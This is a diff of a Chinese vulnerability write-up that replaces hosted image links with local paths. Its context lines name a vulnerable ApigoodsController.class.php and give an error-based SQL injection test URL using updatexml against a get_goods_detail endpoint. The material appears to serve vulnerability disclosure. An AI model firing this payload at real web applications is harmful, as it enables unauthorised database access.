@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170929313.png)
+![](./images/202202170929313.png)
 
 存在漏洞的文件为 **ApigoodsController.class.php** , 关键位置为
 
@@ -59,7 +59,7 @@
         );
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170929712.png)
+![](./images/202202170929712.png)
 
 漏洞测试为
 
@@ -67,4 +67,4 @@
 https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170929602.png)
+![](./images/202202170929602.png)
